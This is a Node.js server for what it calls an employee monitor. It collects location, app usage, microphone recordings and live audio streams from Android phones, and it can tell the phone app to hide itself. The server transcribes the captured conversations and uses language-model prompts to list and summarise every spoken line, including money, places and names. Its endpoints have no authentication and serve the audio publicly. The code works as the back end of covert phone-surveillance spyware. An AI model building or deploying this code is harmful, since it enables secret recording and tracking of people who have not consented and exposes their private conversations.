require('dotenv').config();
const express        = require('express');
const http           = require('http');
const { Server }     = require('socket.io');
const path           = require('path');
const fs             = require('fs-extra');
const OpenAI         = require('openai');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, {
    cors: { origin: '*', methods: ['GET','POST'] },
    maxHttpBufferSize: 50e6
});

const PORT = process.env.PORT || 3000;

// ─── Directories ───────────────────────────────────────────────
const DATA_DIR   = path.join(__dirname, 'data');
const AUDIO_DIR  = path.join(DATA_DIR, 'audio');
const LOGS_DIR   = path.join(DATA_DIR, 'logs');
try { fs.ensureDirSync(DATA_DIR); fs.ensureDirSync(AUDIO_DIR); fs.ensureDirSync(LOGS_DIR); }
catch(e) { console.warn('Dir creation warning:', e.message); }

// ─── In-memory stores ──────────────────────────────────────────
const employees    = new Map();   // employeeId → { info, socketId }
const locationLogs = new Map();   // employeeId → [ ...events ]
const appUsageLogs = new Map();   // employeeId → [ ...events ]
const voiceLogs    = new Map();   // employeeId → [ ...filenames ]
const hiddenApps   = new Map();   // employeeId → boolean
const notices      = [];          // [ { id, title, message, createdAt } ]

// ─── AI Agent (CrewAI-style) ───────────────────────────────────
const GROQ_API_KEY = process.env.GROQ_API_KEY || '';
const aiAgentState = new Map();   // employeeId → { active, startTime, usageBuffer[], voiceBuffer[] }
const aiSummaries  = [];          // [ { id, type, employeeId, employeeName, ... } ]

// ─── Middleware ────────────────────────────────────────────────
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/audio', express.static(AUDIO_DIR)); // serve recorded audio

// ─── Routes ───────────────────────────────────────────────────

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// ─── API Endpoints ─────────────────────────────────────────────

app.get('/api/employees', (req, res) => {
    const list = [];
    employees.forEach((emp, id) => {
        list.push({
            employeeId:   id,
            employeeName: emp.info.employeeName,
            device:       emp.info.device,
            androidVersion: emp.info.androidVersion,
            online:       emp.online,
            lastSeen:     emp.lastSeen,
            appHidden:    hiddenApps.get(id) || false,
            locationCount: (locationLogs.get(id) || []).length,
            voiceCount:   (voiceLogs.get(id) || []).length,
            appCount:     (appUsageLogs.get(id) || []).length
        });
    });
    res.json(list);
});

app.get('/api/location/:empId', (req, res) => {
    const logs = locationLogs.get(req.params.empId) || [];
    res.json(logs.slice(-200)); // last 200 points
});

app.get('/api/appusage/:empId', (req, res) => {
    const logs = appUsageLogs.get(req.params.empId) || [];

    // Aggregate: sum usage per app
    const agg = {};
    logs.forEach(e => {
        if (!agg[e.appName]) agg[e.appName] = { appName: e.appName, packageName: e.packageName, totalMs: 0, entries: 0 };
        agg[e.appName].totalMs  += e.usageMs;
        agg[e.appName].entries  += 1;
        agg[e.appName].lastUsed  = e.lastUsed;
    });

    const result = Object.values(agg)
        .sort((a,b) => b.totalMs - a.totalMs)
        .slice(0, 50);
    res.json(result);
});

// App usage time-based history
app.get('/api/appusage/:empId/history', (req, res) => {
    const logs = appUsageLogs.get(req.params.empId) || [];
    const from = parseInt(req.query.from) || 0;
    const to   = parseInt(req.query.to)   || Date.now();

    // Filter entries within time range
    const filtered = logs.filter(e => {
        const t = e.timestamp || new Date(e.receivedAt).getTime();
        return t >= from && t <= to;
    });

    // Group by hour
    const hourly = {};
    filtered.forEach(e => {
        const t = new Date(e.timestamp || e.receivedAt);
        const hourKey = t.getFullYear() + '-' +
            String(t.getMonth()+1).padStart(2,'0') + '-' +
            String(t.getDate()).padStart(2,'0') + ' ' +
            String(t.getHours()).padStart(2,'0') + ':00';

        if (!hourly[hourKey]) hourly[hourKey] = {};
        if (!hourly[hourKey][e.appName]) hourly[hourKey][e.appName] = { appName: e.appName, packageName: e.packageName, totalMs: 0 };
        hourly[hourKey][e.appName].totalMs += e.usageMs;
    });

    // Convert to sorted array
    const result = Object.entries(hourly)
        .sort((a,b) => b[0].localeCompare(a[0]))
        .map(([hour, apps]) => ({
            hour,
            apps: Object.values(apps).sort((a,b) => b.totalMs - a.totalMs)
        }));
    res.json(result);
});

app.get('/api/voice/:empId', (req, res) => {
    const files = voiceLogs.get(req.params.empId) || [];
    res.json(files.slice(-50).reverse()); // last 50
});

app.get('/api/stats', (req, res) => {
    let onlineCount = 0;
    employees.forEach(e => { if (e.online) onlineCount++; });
    res.json({
        totalEmployees: employees.size,
        onlineNow: onlineCount,
        totalVoiceFiles: [...voiceLogs.values()].reduce((s,a) => s + a.length, 0)
    });
});

// ─── DELETE Endpoints ──────────────────────────────────────────

app.delete('/api/employees/:empId', (req, res) => {
    const id = req.params.empId;
    employees.delete(id);
    locationLogs.delete(id);
    appUsageLogs.delete(id);
    voiceLogs.delete(id);
    hiddenApps.delete(id);
    // Delete audio files
    const empAudioDir = path.join(AUDIO_DIR, id);
    fs.remove(empAudioDir).catch(() => {});
    io.emit('stats_update', getStats());
    res.json({ success: true, message: `Employee ${id} and all data deleted` });
});

app.delete('/api/location/:empId', (req, res) => {
    locationLogs.delete(req.params.empId);
    res.json({ success: true, message: 'Location data deleted' });
});

app.delete('/api/appusage/:empId', (req, res) => {
    appUsageLogs.delete(req.params.empId);
    res.json({ success: true, message: 'App usage data deleted' });
});

app.delete('/api/voice/:empId', (req, res) => {
    voiceLogs.delete(req.params.empId);
    const empAudioDir = path.join(AUDIO_DIR, req.params.empId);
    fs.remove(empAudioDir).catch(() => {});
    io.emit('stats_update', getStats());
    res.json({ success: true, message: 'Voice recordings deleted' });
});

app.delete('/api/voice/:empId/:filename', (req, res) => {
    const { empId, filename } = req.params;
    const files = voiceLogs.get(empId) || [];
    const idx = files.findIndex(f => f.filename === filename);
    if (idx !== -1) {
        files.splice(idx, 1);
        const filePath = path.join(AUDIO_DIR, empId, filename);
        fs.remove(filePath).catch(() => {});
    }
    io.emit('stats_update', getStats());
    res.json({ success: true, message: 'Voice recording deleted' });
});

app.delete('/api/voice-all', (req, res) => {
    voiceLogs.clear();
    fs.emptyDir(AUDIO_DIR).catch(() => {});
    io.emit('stats_update', getStats());
    res.json({ success: true, message: 'All voice recordings deleted' });
});

// ─── Notice Board API ──────────────────────────────────────────

app.get('/api/notices', (req, res) => {
    res.json(notices.slice().reverse());
});

app.post('/api/notices', (req, res) => {
    const { title, message } = req.body;
    if (!title || !message) {
        return res.status(400).json({ error: 'Title and message are required' });
    }
    const notice = {
        id: Date.now().toString(),
        title: String(title).substring(0, 200),
        message: String(message).substring(0, 2000),
        createdAt: new Date()
    };
    notices.push(notice);
    // Keep only last 100 notices
    if (notices.length > 100) notices.splice(0, notices.length - 100);
    // Broadcast to all connected devices and admin panels
    io.emit('new_notice', notice);
    res.json({ success: true, notice });
});

app.delete('/api/notices/:id', (req, res) => {
    const idx = notices.findIndex(n => n.id === req.params.id);
    if (idx !== -1) notices.splice(idx, 1);
    io.emit('notices_updated', notices.slice().reverse());
    res.json({ success: true });
});

// ─── AI Agent (CrewAI-style) API ───────────────────────────────

app.get('/api/ai-config', (req, res) => {
    res.json({ configured: !!GROQ_API_KEY });
});

// Debug: test transcription on a specific audio file
app.get('/api/debug-transcribe/:empId/:filename', async (req, res) => {
    if (!GROQ_API_KEY) return res.status(500).json({ error: 'No GROQ_API_KEY' });
    const filePath = path.join(AUDIO_DIR, req.params.empId, req.params.filename);
    if (!await fs.pathExists(filePath)) return res.status(404).json({ error: 'File not found' });

    const stat = await fs.stat(filePath);
    const groq = new OpenAI({ apiKey: GROQ_API_KEY, baseURL: 'https://api.groq.com/openai/v1' });

    try {
        const stream = fs.createReadStream(filePath);
        const result = await groq.audio.transcriptions.create({
            model: 'whisper-large-v3',
            file: stream,
            language: 'bn',
            temperature: 0
        });
        res.json({
            filename: req.params.filename,
            fileSizeKB: (stat.size / 1024).toFixed(1),
            text: result.text,
            textLength: result.text ? result.text.length : 0
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Toggle AI agent on/off per employee
app.post('/api/ai-agent/toggle', async (req, res) => {
    const { employeeId } = req.body;
    if (!employeeId) return res.status(400).json({ error: 'employeeId required' });

    const state = aiAgentState.get(employeeId);

    if (state && state.active) {
        // Turning OFF → respond immediately, generate summary in background
        state.active = false;
        aiAgentState.set(employeeId, state);
        io.emit('ai_agent_toggled', { employeeId, active: false, generating: true });
        res.json({ success: true, active: false, generating: true });

        // Generate both summaries in background (don't block HTTP response)
        generateBothSummaries(employeeId, state).then(summaries => {
            console.log('AI summaries generated for', employeeId);
            summaries.forEach(s => io.emit('ai_summary_ready', s));
            io.emit('ai_agent_toggled', { employeeId, active: false, generating: false });
        }).catch(err => {
            console.error('AI summary error:', err);
            io.emit('ai_agent_toggled', { employeeId, active: false, generating: false, error: err.message });
        });
    } else {
        // Turning ON → start monitoring
        aiAgentState.set(employeeId, {
            active: true,
            startTime: Date.now(),
            usageBuffer: [],
            voiceBuffer: []
        });
        io.emit('ai_agent_toggled', { employeeId, active: true });
        res.json({ success: true, active: true });
    }
});

app.get('/api/ai-agent/status/:empId', (req, res) => {
    const state = aiAgentState.get(req.params.empId);
    res.json({ active: state ? state.active : false, startTime: state?.startTime || null });
});

app.get('/api/ai-summaries', (req, res) => {
    res.json(aiSummaries.slice().reverse());
});

app.delete('/api/ai-summaries/:id', (req, res) => {
    const idx = aiSummaries.findIndex(s => s.id === req.params.id);
    if (idx !== -1) aiSummaries.splice(idx, 1);
    res.json({ success: true });
});

// ─── CrewAI-style Multi-Agent Summary Generator ────────────────

async function generateBothSummaries(employeeId, state) {
    if (!GROQ_API_KEY) throw new Error('Groq API key not configured. Set GROQ_API_KEY in .env file.');

    console.log('─── AI Summary Generation Started ───');
    console.log('Employee:', employeeId, '| Monitoring since:', new Date(state.startTime).toLocaleString());

    const groq = new OpenAI({
        apiKey: GROQ_API_KEY,
        baseURL: 'https://api.groq.com/openai/v1'
    });
    const emp = employees.get(employeeId);
    const employeeName = emp ? emp.info.employeeName : employeeId;
    const monitoringStart = new Date(state.startTime);
    const monitoringEnd = new Date();

    const results = [];

    // ════════════════════════════════════════════════════════════
    // SUMMARY 1: Voice / Conversation Analysis
    // ════════════════════════════════════════════════════════════
    console.log('── Generating Voice Analysis Summary ──');

    let voiceText = '';
    const recentVoices = (voiceLogs.get(employeeId) || [])
        .filter(v => {
            const t = v.timestamp || new Date(v.receivedAt).getTime();
            return t >= state.startTime;
        })
        .slice(-15); // Last 15 files max

    console.log('Voice files found since start:', recentVoices.length);

    if (recentVoices.length > 0) {
        const transcriptions = [];
        for (const vf of recentVoices) {
            try {
                const filePath = path.join(AUDIO_DIR, employeeId, vf.filename);
                console.log('Transcribing:', vf.filename);
                if (await fs.pathExists(filePath)) {
                    // Check file size — skip if too small (likely silence/noise)
                    const stat = await fs.stat(filePath);
                    const fileSizeKB = stat.size / 1024;
                    console.log('File size:', fileSizeKB.toFixed(1), 'KB');
                    if (fileSizeKB < 10) {
                        console.warn('Skipping too small file:', vf.filename);
                        continue;
                    }

                    const stream = fs.createReadStream(filePath);
                    const result = await groq.audio.transcriptions.create({
                        model: 'whisper-large-v3',
                        file: stream,
                        language: 'bn',
                        temperature: 0
                    });
                    const text = (result.text || '').trim();
                    console.log('Transcription [' + text.length + ' chars]:', text.substring(0, 100));

                    if (text && text.length > 3) {
                        transcriptions.push(text);
                    } else {
                        console.warn('Empty/too short transcription for', vf.filename);
                    }
                } else {
                    console.warn('File not found:', filePath);
                }
            } catch (e) {
                console.warn('Transcription error for', vf.filename, ':', e.message);
            }
        }
        if (transcriptions.length > 0) {
            voiceText = transcriptions.join('\n\n');
        }
    }

    if (voiceText) {
        // Step 1: Extract exact conversation content line by line
        console.log('Running Step 1: Extract exact conversation lines...');
        const step1 = await groq.chat.completions.create({
            model: 'llama-3.3-70b-versatile',
            messages: [
                {
                    role: 'system',
                    content: `তুমি একটি transcription cleaner। তোমার একমাত্র কাজ হলো নিচের transcribed audio text থেকে প্রতিটি কথা/বাক্য আলাদা লাইনে বের করা।

নিয়ম:
- transcription এ যা যা বলা হয়েছে, প্রতিটি কথা আলাদা bullet point এ লিখবে
- যেমন কেউ বলেছে "আজ ঘুরতে যাবো" — সেটা লিখবে: • একজন বলেছে আজ ঘুরতে যাবো
- যেমন কেউ বলেছে "পানি লাগবে" — সেটা লিখবে: • একজন বলেছে পানি লাগবে
- যেমন কেউ বলেছে "৫০০ টাকা দিতে হবে" — সেটা লিখবে: • একজন বলেছে ৫০০ টাকা দিতে হবে
- transcription এ যে শব্দ আছে সেই শব্দই ব্যবহার করবে, নিজে থেকে কিছু বানাবে না
- কোনো analysis, opinion, theme, tone, context লিখবে না
- শুধু bullet points, অন্য কিছু না

উদাহরণ output:
• একজন বলেছে আজ বাজারে যেতে হবে
• আরেকজন বলেছে না আজ না, কাল যাবো
• একজন বলেছে চাল আর ডাল কিনতে হবে
• একজন জিজ্ঞেস করেছে কত টাকা লাগবে
• আরেকজন বলেছে ৫০০ টাকা লাগবে মনে হয়
• একজন বলেছে ঠিক আছে কাল সকালে যাবো`
                },
                {
                    role: 'user',
                    content: `এই transcribed audio থেকে প্রতিটি কথা bullet point এ বের করো:\n\n${voiceText}`
                }
            ],
            max_tokens: 1500,
            temperature: 0.1
        });
        const extractedLines = step1.choices[0].message.content;
        console.log('Step 1 done. Extracted lines.');

        // Step 2: Create short summary based on extracted lines
        console.log('Running Step 2: Create summary from extracted lines...');
        const step2 = await groq.chat.completions.create({
            model: 'llama-3.3-70b-versatile',
            messages: [
                {
                    role: 'system',
                    content: `তুমি একজন সারসংক্ষেপ লেখক। নিচে একটি কথোপকথনের bullet points দেওয়া আছে। তোমার কাজ হলো এই কথাগুলো পড়ে ২-৪ লাইনে বলা — ঠিক কি কি বিষয়ে কথা হয়েছে।

নিয়ম:
- specific বিষয় উল্লেখ করবে, যেমন: "ঘুরতে যাওয়া নিয়ে কথা হয়েছে — একজন আজ যেতে চেয়েছে, আরেকজন কাল যেতে চেয়েছে"
- টাকা, জায়গা, সময়, মানুষের নাম — যা যা আছে সব mention করবে
- কখনোই generic কথা লিখবে না যেমন "ব্যক্তিগত বিষয়ে আলোচনা হয়েছে" বা "আবেগীয় কথোপকথন হয়েছে"
- বাংলায় লিখবে`
                },
                {
                    role: 'user',
                    content: `এই কথোপকথনের সারসংক্ষেপ লিখো:\n\n${extractedLines}`
                }
            ],
            max_tokens: 400,
            temperature: 0.2
        });
        const shortSummary = step2.choices[0].message.content;
        console.log('Step 2 done.');

        // Combine both into final output
        const voiceSummaryText = `**📝 কথোপকথনের বিস্তারিত:**\n${extractedLines}\n\n**📌 সারসংক্ষেপ:**\n${shortSummary}`;

        const voiceSummary = {
            id: Date.now().toString() + '_voice',
            type: 'voice',
            employeeId,
            employeeName,
            summary: voiceSummaryText,
            rawTranscription: voiceText,
            audioFilesAnalyzed: recentVoices.length,
            monitoringStart,
            monitoringEnd,
            createdAt: new Date()
        };
        aiSummaries.push(voiceSummary);
        results.push(voiceSummary);
    } else {
        const voiceSummary = {
            id: Date.now().toString() + '_voice',
            type: 'voice',
            employeeId,
            employeeName,
            summary: 'No voice recordings were captured during this monitoring period. No conversations to analyze.',
            rawTranscription: '',
            audioFilesAnalyzed: 0,
            monitoringStart,
            monitoringEnd,
            createdAt: new Date()
        };
        aiSummaries.push(voiceSummary);
        results.push(voiceSummary);
    }

    // ════════════════════════════════════════════════════════════
    // SUMMARY 2: App Usage Duration Summary
    // ════════════════════════════════════════════════════════════
    console.log('── Generating App Usage Summary ──');

    const usageData = (state.usageBuffer || []);
    console.log('App usage events collected:', usageData.length);

    // Aggregate app usage
    const appAgg = {};
    usageData.forEach(e => {
        const name = e.appName || e.packageName || 'Unknown';
        if (!appAgg[name]) appAgg[name] = 0;
        appAgg[name] += (e.usageMs || 0);
    });

    const sortedApps = Object.entries(appAgg).sort((a, b) => b[1] - a[1]);

    // Format duration nicely
    function formatDuration(ms) {
        const totalMin = Math.round(ms / 60000);
        if (totalMin >= 60) {
            const hrs = Math.floor(totalMin / 60);
            const mins = totalMin % 60;
            return mins > 0 ? `${hrs} hr ${mins} min` : `${hrs} hr`;
        }
        return totalMin > 0 ? `${totalMin} min` : '< 1 min';
    }

    // Build raw usage text
    const appUsageLines = sortedApps.map(([app, ms]) => `${app}: ${formatDuration(ms)}`);
    const appUsageText = appUsageLines.join('\n') || 'No app usage data collected.';
    const totalScreenTime = sortedApps.reduce((sum, [, ms]) => sum + ms, 0);

    console.log('App usage aggregated:\n', appUsageText);

    if (sortedApps.length > 0) {
        // Agent: App Usage Analyst
        console.log('Running App Usage Analyst Agent...');
        const appAgent = await groq.chat.completions.create({
            model: 'llama-3.3-70b-versatile',
            messages: [
                {
                    role: 'system',
                    content: `তুমি একজন অ্যাপ ব্যবহার বিশ্লেষক AI। তোমার কাজ হলো কর্মীর ফোনে কোন অ্যাপ কতক্ষণ ব্যবহার হয়েছে তার একটি পরিষ্কার সারাংশ তৈরি করা।

সম্পূর্ণ বাংলায় লিখবে।

ফরম্যাট:

**📱 অ্যাপ ব্যবহারের তালিকা:**
• Facebook: ২ ঘণ্টা ১৫ মিনিট
• YouTube: ৪৫ মিনিট
• Chrome: ৩০ মিনিট
(এভাবে সব অ্যাপ তালিকা করবে)

**⏱️ মোট স্ক্রিন টাইম:** [মোট সময়]

**🏆 সবচেয়ে বেশি ব্যবহৃত ৩টি অ্যাপ:**
১. [অ্যাপ ১]
২. [অ্যাপ ২]
৩. [অ্যাপ ৩]

**📌 সারসংক্ষেপ:** [১-২ লাইনে বলবে — বেশিরভাগ সময় কিসে কেটেছে, সোশ্যাল মিডিয়া/কাজ/বিনোদন ইত্যাদি]

পরিষ্কার ও সংক্ষিপ্ত রাখবে। সময় বাংলায় লিখলেও ইংরেজিতে লেখা চলবে (যেমন 2 hr 15 min)।`
                },
                {
                    role: 'user',
                    content: `Employee: ${employeeName}\nMonitoring Period: ${monitoringStart.toLocaleString()} to ${monitoringEnd.toLocaleString()}\nTotal Screen Time: ${formatDuration(totalScreenTime)}\n\n--- APP USAGE DATA ---\n${appUsageText}`
                }
            ],
            max_tokens: 600,
            temperature: 0.3
        });
        const appSummaryText = appAgent.choices[0].message.content;
        console.log('App Usage Agent done.');

        const appSummary = {
            id: Date.now().toString() + '_app',
            type: 'appusage',
            employeeId,
            employeeName,
            summary: appSummaryText,
            rawUsageData: appUsageLines,
            totalScreenTime: formatDuration(totalScreenTime),
            appCount: sortedApps.length,
            monitoringStart,
            monitoringEnd,
            createdAt: new Date()
        };
        aiSummaries.push(appSummary);
        results.push(appSummary);
    } else {
        const appSummary = {
            id: Date.now().toString() + '_app',
            type: 'appusage',
            employeeId,
            employeeName,
            summary: 'No app usage data was collected during this monitoring period.',
            rawUsageData: [],
            totalScreenTime: '0 min',
            appCount: 0,
            monitoringStart,
            monitoringEnd,
            createdAt: new Date()
        };
        aiSummaries.push(appSummary);
        results.push(appSummary);
    }

    // Trim summaries to last 100
    if (aiSummaries.length > 100) aiSummaries.splice(0, aiSummaries.length - 100);

    console.log('─── AI Summary Generation Complete ───');
    console.log('Generated', results.length, 'summaries for', employeeName);
    return results;
}

// ─── Socket.IO ────────────────────────────────────────────────

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // ── Employee registers ──
    socket.on('employee_register', (data) => {
        const { employeeId, employeeName, device, androidVersion } = data;
        console.log(`Employee registered: ${employeeName} (${employeeId})`);

        employees.set(employeeId, {
            info: { employeeId, employeeName, device, androidVersion },
            socketId: socket.id,
            online: true,
            lastSeen: new Date()
        });

        socket.employeeId = employeeId;

        io.emit('employee_status_change', { employeeId, employeeName, online: true });
        io.emit('stats_update', getStats());
    });

    // ── Location update ──
    socket.on('location_update', (data) => {
        const { employeeId, employeeName } = data;
        if (!locationLogs.has(employeeId)) locationLogs.set(employeeId, []);

        const event = { ...data, receivedAt: new Date() };
        locationLogs.get(employeeId).push(event);

        // Keep only last 1000 per employee
        const arr = locationLogs.get(employeeId);
        if (arr.length > 1000) arr.splice(0, arr.length - 1000);

        // Broadcast to admin panel
        io.emit('live_location', event);

        // Write to log file (async)
        appendToLog(employeeId, 'location', event);
    });

    // ── App usage ──
    socket.on('app_usage', (data) => {
        const { employeeId } = data;
        if (!appUsageLogs.has(employeeId)) appUsageLogs.set(employeeId, []);
        appUsageLogs.get(employeeId).push({ ...data, receivedAt: new Date() });

        // Trim to last 5000
        const arr = appUsageLogs.get(employeeId);
        if (arr.length > 5000) arr.splice(0, arr.length - 5000);

        // Feed into AI agent buffer if active
        const aiState = aiAgentState.get(employeeId);
        if (aiState && aiState.active) {
            aiState.usageBuffer.push({ ...data, receivedAt: new Date() });
        }

        io.emit('live_app_usage', data);
        appendToLog(employeeId, 'appusage', data);
    });

    // ── Voice recording ──
    socket.on('voice_data', async (data) => {
        const { employeeId, employeeName, audioData, filename, timestamp, durationMs } = data;

        try {
            const empDir = path.join(AUDIO_DIR, employeeId);
            await fs.ensureDir(empDir);

            const filePath = path.join(empDir, filename);
            const buffer   = Buffer.from(audioData, 'base64');
            await fs.writeFile(filePath, buffer);

            const fileInfo = {
                filename,
                employeeId,
                employeeName,
                timestamp,
                durationMs,
                url: `/audio/${employeeId}/${filename}`,
                receivedAt: new Date()
            };

            if (!voiceLogs.has(employeeId)) voiceLogs.set(employeeId, []);
            voiceLogs.get(employeeId).push(fileInfo);

            io.emit('new_voice_recording', fileInfo);
            console.log(`Voice saved: ${filename} (${(buffer.length/1024).toFixed(1)} KB)`);
        } catch (err) {
            console.error('Voice save error:', err);
        }
    });

    // ── Real-time audio stream relay ──
    socket.on('audio_stream', (data) => {
        // Relay live audio to all admin panels
        console.log(`Audio chunk from ${data.employeeId}, size=${data.audioChunk?.length || 0}`);
        socket.broadcast.emit('audio_stream', data);
    });

    // ── App hidden status from device ──
    socket.on('app_hidden_status', (data) => {
        const { employeeId, hidden } = data;
        hiddenApps.set(employeeId, hidden);
        io.emit('app_hidden_changed', { employeeId, hidden });
    });

    // ── Admin sends hide/unhide command ──
    socket.on('admin_hide_app', (data) => {
        const { employeeId, hide } = data;
        io.emit('command_hide_app', { employeeId, hide });
        hiddenApps.set(employeeId, hide);
        io.emit('app_hidden_changed', { employeeId, hidden: hide });
    });

    // ── Disconnect ──
    socket.on('disconnect', () => {
        if (socket.employeeId) {
            const emp = employees.get(socket.employeeId);
            if (emp) {
                emp.online   = false;
                emp.lastSeen = new Date();
                io.emit('employee_status_change', {
                    employeeId:   socket.employeeId,
                    employeeName: emp.info.employeeName,
                    online: false
                });
                io.emit('stats_update', getStats());
            }
        }
        console.log('Disconnected:', socket.id);
    });
});

// ─── Helpers ──────────────────────────────────────────────────

function getStats() {
    let onlineCount = 0;
    employees.forEach(e => { if (e.online) onlineCount++; });
    return {
        totalEmployees: employees.size,
        onlineNow: onlineCount,
        totalVoiceFiles: [...voiceLogs.values()].reduce((s,a) => s + a.length, 0)
    };
}

async function appendToLog(employeeId, type, data) {
    const file = path.join(LOGS_DIR, `${employeeId}_${type}.jsonl`);
    try {
        await fs.appendFile(file, JSON.stringify(data) + '\n');
    } catch(e) { /* non-critical */ }
}

// ─── Start ────────────────────────────────────────────────────

server.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔═══════════════════════════════════════╗
║  Employee Monitor Admin Panel         ║
║  Running on port ${PORT}                ║
╚═══════════════════════════════════════╝
    `);
});
